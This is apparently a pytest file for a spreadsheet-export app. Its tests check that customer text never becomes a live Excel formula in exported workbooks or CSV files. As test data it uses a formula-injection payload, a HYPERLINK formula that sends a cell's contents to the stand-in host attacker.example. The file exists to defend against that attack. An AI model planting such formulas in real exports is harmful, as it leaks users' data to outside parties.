"""Contracts for export safety (v34.48, audit C3).

Customer text must never become a live Excel formula in anything the app
exports. openpyxl stores any string that starts with "=" as a formula, so a
cell such as ``=HYPERLINK("http://x",...)`` in an uploaded workbook used to
come out of the plan workbook and the Article setup workbook as a working
formula. The fix keeps every value visibly identical and only changes how it
is stored: formula-typed cells are written as plain text. The CSV download
of a stored run is protected the standard way (a leading apostrophe on text
that starts with a formula trigger), because Excel evaluates CSV cells that
start with = + - or @.
"""

from io import BytesIO

import pandas as pd
from openpyxl import Workbook, load_workbook

from engine.export_safety import csv_safe_frame, neutralize_formula_cells
from engine.kromi_numbering import ARTICLE_SETUP_COLUMNS
from engine.workbook import build_article_setup_workbook

PAYLOAD = '=HYPERLINK("http://attacker.example/?d="&A2,"click")'


def _formula_cells(xbytes: bytes) -> list[tuple[str, str]]:
    wb = load_workbook(BytesIO(xbytes))
    hits = []
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                if c.data_type == "f":
                    hits.append((ws.title, c.coordinate))
    return hits


# ---- the neutralizer -------------------------------------------------------

def test_neutralize_turns_formulas_into_text_keeping_the_value():
    wb = Workbook()
    ws = wb.active
    ws["A1"] = "=1+1"
    ws["B1"] = PAYLOAD
    ws["C1"] = "+SUM(1,1)"
    ws["D1"] = 42
    ws["E1"] = "plain"
    assert ws["A1"].data_type == "f"
    n = neutralize_formula_cells(wb)
    assert n == 2
    assert ws["A1"].data_type == "s" and ws["A1"].value == "=1+1"
    assert ws["B1"].data_type == "s" and ws["B1"].value == PAYLOAD
    assert ws["D1"].value == 42 and ws["D1"].data_type == "n"
    assert ws["E1"].value == "plain"
    bio = BytesIO()
    wb.save(bio)
    assert _formula_cells(bio.getvalue()) == []


def test_article_setup_workbook_never_writes_formulas():
    row = {c: "" for c in ARTICLE_SETUP_COLUMNS}
    row.update({"Kromi_Art_No": "191100001000",
                "Customer article No": "=1+1", "Description": PAYLOAD})
    xbytes = build_article_setup_workbook(pd.DataFrame([row]))
    assert _formula_cells(xbytes) == []
    ws = load_workbook(BytesIO(xbytes))["Article setup"]
    assert ws["B2"].value == "=1+1"          # visibly unchanged
    assert ws["C2"].value == PAYLOAD


def test_plan_workbook_never_writes_formulas():
    from engine.workbook import build_result_workbook

    work = pd.DataFrame([{
        "Code": "=1+1", "Listing": "Tools", "Description": PAYLOAD,
        "SystemCategory": "KTC", "CabinetType": "Helix",
        "ToolClass": "solid_carbide_drill", "PackUnits": 1.0,
        "Monthly_packs": 1.0, "Spirals_needed": 1, "Carousel_stockpiles": 0,
    }])
    empty = pd.DataFrame()
    ov_stats = {"rows_touched": 0, "unmatched_overrides": [],
                "invalid_overrides": [], "applied_overrides": []}
    xbytes, *_ = build_result_workbook(
        work=work, df_summary=empty, df_audit=empty, df_bucket_compare=empty,
        presentation_compact_df=empty, presentation_detail_df=empty,
        dist_cat_rows=empty, dist_cat_vol=empty, dist_cabtype=empty,
        dist_system=empty, include_planogram=False, include_technical=True,
        ktc_id="191", apply_overrides_ui=False, enable_bulk_routing=False,
        multiple_listings=False, consumption_period_months=12.0,
        content_key="t", _df_run_meta=empty, _bucket_plans=[],
        _listings_arg=None, _listings_in_data=["Tools"], _base_info=None,
        _vend_stats={}, _override_stats=ov_stats,
    )
    assert _formula_cells(xbytes) == []
    wb = load_workbook(BytesIO(xbytes))
    values = {c.value for ws in wb.worksheets for r in ws.iter_rows() for c in r}
    assert "=1+1" in values and PAYLOAD in values   # content preserved as text


# ---- CSV -------------------------------------------------------------------

def test_csv_safe_frame_prefixes_formula_triggers():
    df = pd.DataFrame({
        "Code": ["=1+1", "+SUM(1,1)", "@SUM(1)", "-2+3 drill", "\tx", "ABC-1"],
        "Qty": [1, 2, 3, 4, 5, 6],
    })
    out = csv_safe_frame(df)
    assert list(out["Code"]) == ["'=1+1", "'+SUM(1,1)", "'@SUM(1)",
                                 "'-2+3 drill", "'\tx", "ABC-1"]
    assert list(out["Qty"]) == [1, 2, 3, 4, 5, 6]


def test_csv_safe_frame_leaves_numbers_and_placeholders_alone():
    df = pd.DataFrame({"v": ["-5", "+3.5", "-", "1e3", "-0,75", None, 7]})
    out = csv_safe_frame(df)
    assert list(out["v"])[:5] == ["-5", "+3.5", "-", "1e3", "-0,75"]
    assert out["v"].iloc[5] is None and out["v"].iloc[6] == 7


def test_csv_safe_frame_never_mutates_input():
    df = pd.DataFrame({"Code": ["=1+1"]})
    csv_safe_frame(df)
    assert df["Code"].iloc[0] == "=1+1"
